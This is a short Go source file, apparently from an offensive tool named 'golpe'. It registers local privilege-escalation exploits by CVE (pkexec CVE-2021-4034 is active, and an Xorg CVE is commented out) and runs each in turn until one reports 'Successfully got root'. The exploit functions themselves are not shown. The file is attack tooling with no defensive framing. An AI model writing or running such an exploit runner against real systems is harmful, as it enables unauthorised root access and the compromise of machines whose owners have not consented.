package golpe

import "log"

var All = map[string]func() error{
	"CVE-2021-4034": CVE_2021_4034, // pkexec
	// "CVE-2021-4034": blasty_vs_pkexec, // pkexec
	// "CVE-2018-14655": CVE_2018_14655, // xorg
}

func RunAll() (err error) {
	for cve, exp := range All {
		log.Printf("Trying %s...", cve)
		err = exp()
		if err == nil {
			log.Printf("Successfully got root via %s", cve)
			break
		}
		log.Printf("%s: %v", cve, err)
	}
	return
}
